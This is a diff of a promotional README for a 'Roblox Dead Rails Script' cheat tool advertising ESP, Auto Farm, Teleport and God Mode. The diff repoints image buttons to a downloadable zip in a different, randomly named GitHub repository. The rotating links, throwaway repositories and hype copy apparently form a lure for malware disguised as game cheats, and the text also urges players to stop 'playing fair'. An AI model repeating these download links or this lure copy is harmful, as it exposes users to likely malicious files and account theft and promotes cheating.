@@ -3,10 +3,10 @@
 Are you looking for the most updated and powerful **Roblox Dead Rails Script** in 2025? You’re in the right place. This complete guide will walk you through everything you need to know about scripting in Dead Rails — from how to inject scripts, where to find the best ones, to unlocking cheat features like ESP, Auto Farm, Teleport, God Mode, and more.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 If you’re tired of playing fair in Roblox Dead Rails and want to unleash hidden abilities, then keep reading — we’ve got the ultimate toolkit for dominating this haunted train survival game.
